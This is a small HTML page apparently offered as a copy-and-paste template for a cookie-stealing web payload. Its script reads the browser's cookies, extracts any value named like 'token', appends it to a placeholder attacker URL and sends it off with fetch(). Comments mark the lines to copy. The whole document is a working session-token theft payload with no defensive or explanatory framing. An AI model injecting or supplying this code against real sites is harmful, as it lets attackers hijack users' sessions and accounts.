<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get method cookie stealing</title>
</head>
<body>
    <script>
        // Template for GET method cookie stealing.
        // Copy starts here
        var attackerUrl = 'https://insert-url/token=';

        var cookie = document.cookie.split(';');
        var token = '';

        for(let i=0; i<cookie.length; i++) { 
            if(cookie[i].includes('token')) { 
                token = cookie[i].split('=')[1]; 
                break;
            } 
        }

        attackerUrl += token;

        fetch(attackerUrl)
        .then((response) => {
            console.log(response);
        })
        .catch((error) => {
            console.log(`[-] Error : ${error}`);
        });
        // Copy ends here
    </script>
</body>
</html>
